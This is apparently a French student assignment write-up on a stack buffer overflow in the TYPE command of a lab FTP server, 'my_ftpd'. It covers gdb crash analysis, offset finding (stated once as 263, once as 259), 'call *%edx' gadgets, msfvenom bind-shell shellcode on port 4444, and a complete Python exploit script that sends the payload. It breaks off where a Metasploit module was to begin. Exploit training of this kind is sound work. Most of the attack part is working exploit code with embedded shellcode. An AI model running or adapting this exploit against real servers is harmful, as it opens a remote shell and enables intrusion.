# TATT - DM3

On peut lancer le serveur FTP avec gdb : 

```bash
sudo gdb ./my_ftpd
set follow-fork-mode child
run -u users.txt -v 3 -l log.txt
```

Pour le lancer normalement, on peut utiliser la commande suivante :

```bash
sudo ./my_ftpd -u users.txt -v 3 -l log.txt
```

---

Les erreurs intéressants : 

```
STOR {A * 100}
TYPE {A * 500,1000,2000,5000} -> la plus intéresssante
```

---

On test avec des cyclic pattern de 500 car c'est la taille la plus petite qui crash le programme, on voit avec la backtrace que la première valeur que nous controlons est en position 60 de la backtrace, on peut donc se douter que l'offset est aux alentours des 500 - (59 * 4) = 264.

Avec gdb, on trouve que l'offset exact est 263

```bash
msf-pattern_offset -q 0x69413669
[*] Exact match at offset 259
```

Lors du crash on a :

```bash
(gdb) info registers
eax 0x0 0
ecx 0x0 0
edx 0xbffff2f9 -1073745159
ebx 0x0 0
esp 0xbffff400 0xbffff400
ebp 0x41356941 0x41356941
esi 0x804c990 134531472
edi 0xb7ffeb80 -1207964800
eip 0x69413669 0x69413669
eflags 0x10202 [ IF RF ]
cs 0x73 115
ss 0x7b 123
ds 0x7b 123
es 0x7b 123
fs 0x0 0
gs 0x33 51
(gdb) x/20x $esp
0xbffff400: 0x00000000 0x080520d0 0x00000000 0x00000000
0xbffff410: 0x08052058 0x00000000 0x08052048 0x00000003
0xbffff420: 0x08052050 0xb7ffeb80 0xbffff458 0x0804c654
0xbffff430: 0x0804f1c4 0x0804f1a0 0x08052050 0xb7e8ff3a
0xbffff440: 0x08051ad0 0x0804d435 0xb7e634c9 0x08051c40
(gdb) x/100 $edx
0xbffff2f9: 0x41306141 0x61413161 0x33614132 0x41346141
0xbffff309: 0x61413561 0x37614136 0x41386141 0x62413961
...
```

On voit que edx pointe sur le buffer contenant le payload, on peut donc utiliser edx pour écrire notre shellcode.

On trouve des instructions dans le binaire nous permettant de sauter à l'adresse de notre shellcode :

```bash
objdump -d my_ftpd | grep -E "(call.*edx|jmp.*edx)"
 80493c2:	ff d2                	call   *%edx
 804b0ca:	ff d2                	call   *%edx
 804b5ed:	ff d2                	call   *%edx
 804c652:	ff d2                	call   *%edx
```

Il est important que le shellcode doit être assez court pour ne pas dépasser sur l'adresse de retour : 

```
[SHELLCODE] + [PADDING] + [ADRESSE_RETOUR]
    |              |           |
    |              |           +-- 4 octets (à l'offset 259)
    |              +-------------- PADDING pour atteindre 259 octets
    +----------------------------- SHELLCODE (doit faire < 259 octets)
```

Avec cette commande, on peut générer un shellcode de bind shell qui écoute sur le port 4444 :

```bash
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -b '\x00\x0a\x0d\x20' -f python
```

Le shellcode généré fait 105 octets, donc on peut l'utiliser directement.

Avec ce script on peut donc faire un POC d'un bind shell :

```python
#!/usr/bin/env python3
import socket
import struct

# Configuration
TARGET = "127.0.0.1"
PORT = 21

def create_exploit():
    # Adresse d'une instruction qui utilise EDX (À TROUVER avec objdump)
    # Exemple : si vous trouvez "call *%edx" à 0x08048xxx
    call_edx_addr = 0x80493c2

    # Shellcode simple bind shell (port 4444)
    # msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -b '\x00\x0a\x0d\x20' -f python
    shellcode =  b""
    shellcode += b"\xbb\xfe\xef\xf9\xda\xdb\xc1\xd9\x74\x24\xf4\x5e"
    shellcode += b"\x33\xc9\xb1\x14\x83\xee\xfc\x31\x5e\x10\x03\x5e"
    shellcode += b"\x10\x1c\x1a\xc8\x01\x17\x06\x78\xf5\x84\xa3\x7d"
    shellcode += b"\x70\xcb\x84\xe4\x4f\x8b\xbe\xb6\x1d\xe3\x42\x47"
    shellcode += b"\xb3\xaf\x28\x57\xe2\x1f\x24\xb6\x6e\xf9\x6e\xf4"
    shellcode += b"\xef\x8c\xce\x02\x43\x8a\x60\x6c\x6e\x12\xc3\xc1"
    shellcode += b"\x16\xdf\x44\xb2\x8e\xb5\x7b\xed\xfd\xc9\xcd\x74"
    shellcode += b"\x06\xa1\xe2\xa9\x85\x59\x95\x9a\x0b\xf0\x0b\x6c"
    shellcode += b"\x28\x52\x87\xe7\x4e\xe2\x2c\x35\x10"

    # Construction : shellcode + padding + adresse de retour
    offset = 259
    padding_size = offset - len(shellcode)

    if padding_size < 0:
        print("[-] Shellcode trop long !")
        return None

    exploit = shellcode + b"A" * padding_size + struct.pack("<I", call_edx_addr)
    return exploit

def send_exploit():
    print("[*] Création de l'exploit...")
    payload = create_exploit()

    if not payload:
        return

    print(f"[*] Taille payload: {len(payload)} octets")
    print("[*] Connexion au serveur FTP...")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET, PORT))

        # Bannière
        banner = s.recv(1024)
        print(f"[+] {banner.decode().strip()}")

        # Auth
        s.send(b"USER test\r\n")
        resp = s.recv(1024)
        print(f"[+] {resp.decode().strip()}")

        s.send(b"PASS test\r\n")
        resp = s.recv(1024)
        print(f"[+] {resp.decode().strip()}")

        print("[*] Envoi de l'exploit...")
        s.send(b"TYPE " + payload + b"\r\n")

        print("[+] Exploit envoyé !")
        print("[*] Si bind shell: nc TARGET_IP 4444")

    except Exception as e:
        print(f"[-] Erreur: {e}")
    finally:
        try:
            s.close()
        except:
            pass

if __name__ == "__main__":
    print("=== POC Exploit TYPE buffer Overflow ===")
    print("[!] N'oubliez pas de remplacer call_edx_addr !")
    send_exploit()
```

Il ne reste plus qu'à écrire l'exploit en ruby pour Metasploit :

```ruby